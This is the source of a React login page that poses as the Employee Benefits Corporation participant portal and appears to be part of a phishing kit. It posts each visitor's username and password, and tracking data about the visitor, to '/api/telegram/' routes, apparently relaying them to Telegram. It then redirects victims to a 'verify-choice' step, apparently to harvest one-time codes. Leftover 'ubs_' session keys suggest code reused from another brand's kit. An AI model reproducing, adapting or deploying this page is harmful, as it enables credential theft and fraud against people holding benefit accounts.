"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  const [hasInteracted, setHasInteracted] = useState(false);
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [zip, setZip] = useState("");
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(0);
  const [honeypot, setHoneypot] = useState("");
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);
  const router = useRouter();

  const zipDigits = zip.replace(/\D/g, "");
  const isMobileFormValid =
    firstName.trim() !== "" && lastName.trim() !== "" && zipDigits.length >= 5;

  const handleDesktopSignIn = async (event: any) => {
    event.preventDefault();
    if (isLoginLoading || !username || !password) return;
    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }
    setLoginError(null);
    setIsLoginLoading(true);

    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });
      if (!response.ok) {
        throw new Error("Failed to send login data");
      }

      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
      }

      setCountdown(10);
      countdownRef.current = window.setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            if (countdownRef.current) {
              window.clearInterval(countdownRef.current);
              countdownRef.current = null;
            }
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      redirectRef.current = window.setTimeout(() => {
        router.push("/verify-choice");
      }, 10000);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Unable to send login details. Please try again.");
      setIsLoginLoading(false);
    }
  };

  const handleMobileSignIn = async (event: any) => {
    event.preventDefault();
    if (isLoginLoading || !username || !password) return;
    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }
    setLoginError(null);
    setIsLoginLoading(true);

    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });
      if (!response.ok) {
        throw new Error("Failed to send login data");
      }

      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
      }

      setCountdown(10);
      countdownRef.current = window.setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            if (countdownRef.current) {
              window.clearInterval(countdownRef.current);
              countdownRef.current = null;
            }
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      redirectRef.current = window.setTimeout(() => {
        router.push("/verify-choice");
      }, 10000);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Unable to send login details. Please try again.");
      setIsLoginLoading(false);
    }
  };

  useEffect(() => {
    return () => {
      if (countdownRef.current) {
        window.clearInterval(countdownRef.current);
      }
      if (redirectRef.current) {
        window.clearTimeout(redirectRef.current);
      }
    };
  }, []);

  return (
    <div className="bg-white min-h-screen">
      <main className="max-w-5xl mx-auto px-5 py-8 md:py-10">
        <header className="flex items-center gap-2">
          <img
            src="/emp/images/logo.png"
            alt="Employee Benefits Corporation"
            className="w-28 md:w-40"
          />

          <div className="h-24 md:h-32 w-px bg-gray-300 mx-7"></div>

          <h1 className="text-2xl md:text-4xl font-medium text-gray-400">
            Participant Log In
          </h1>
        </header>

        <section>
          <p className="mt-10 text-lg md:text-2xl font-medium leading-tight">
            Enter your username and password to access your individual benefit
            account.
          </p>

          <hr className="my-4 md:my-8 border-gray-300" />
        </section>

        <div className="flex gap-4 rounded border border-sky-200 bg-sky-100 p-4">
          <i className="fa-solid fa-circle-info text-3xl text-sky-700"></i>
          <p className="text-lg leading-relaxed text-sky-700">
            To manage your organization's benefit plan,
            <button
              onClick={() => router.push("/")}
              className="text-sky-500 hover:underline ml-1"
            >
              log in as an employer.
            </button>
          </p>
        </div>

        <section className="flex flex-col md:flex-row gap-6 md:gap-27 mt-10">
          <div>
            <form onSubmit={handleDesktopSignIn} className="space-y-6">
              <div className="flex flex-col md:grid md:grid-cols-[180px_1fr] md:gap-x-5 mb-4">
                <label
                  htmlFor="userId"
                  className="md:text-right font-bold text-[20px] md:leading-10 mb-2 md:mb-0"
                >
                  Username
                </label>
                <div>
                  <input
                    id="userId"
                    type="text"
                    className="w-full md:w-65 h-10 border border-gray-300 rounded-sm px-3 outline-none focus:ring-1 focus:ring-blue-400"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                  />
                  <a
                    onClick={() => router.push("/forgot-id")}
                    className="block mt-1 text-[18px] text-sky-700 hover:underline cursor-pointer"
                  >
                    Forgot Username?
                  </a>
                </div>
              </div>

              <div className="flex flex-col md:grid md:grid-cols-[180px_1fr] md:gap-x-5">
                <label
                  htmlFor="password"
                  className="md:text-right font-bold text-[20px] md:leading-10 mb-2 md:mb-0"
                >
                  Password
                </label>
                <div>
                  <input
                    id="password"
                    type="password"
                    className="w-full md:w-65 h-10 border border-gray-300 rounded-sm px-3 outline-none focus:ring-1 focus:ring-blue-400"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  <a
                    onClick={() => router.push("/forgot-password")}
                    className="block mt-1 text-[18px] text-sky-700 hover:underline cursor-pointer"
                  >
                    Reset Password?
                  </a>
                </div>
              </div>

              <div className="mt-6">
                <button
                  type="submit"
                  disabled={isLoginLoading}
                  className={`mt-8 md:ml-85 ml-32 flex items-center justify-center gap-3 border border-gray-300 rounded px-4 py-3 transition duration-150 ${isLoginLoading ? "bg-gray-100 text-gray-500 cursor-not-allowed" : "bg-white hover:bg-gray-50 active:bg-gray-200 active:scale-[0.98] active:shadow-inner"}`}
                >
                  <i className="fa-solid fa-right-to-bracket text-2xl"></i>
                  <span className="text-[18px]">
                    {isLoginLoading ? "Loading..." : "Log in"}
                  </span>
                </button>
              </div>
            </form>
          </div>

          <div className="mt-8 md:mt-10">
            <img
              src="/emp/images/Participant-Portal-Login.jpg"
              alt="Submit claims with EBCentral or online"
              className="w-150 h-auto object-cover"
            />
          </div>
        </section>

        <section className="mt-10 md:mt-12">
          <h2 className="text-[25px] md:text-[28px] text-gray-800">
            Not a user yet?
          </h2>
          <hr className="my-4 md:my-8 border-gray-300" />
          <button
            onClick={() => router.push("/new-user")}
            className="mt-8 flex items-center gap-3 border border-gray-300 rounded-md bg-white px-6 py-3 text-xl hover:bg-gray-50"
          >
            <i className="fa-solid fa-user"></i>
            <span>Register</span>
          </button>
        </section>
      </main>
    </div>
  );
}
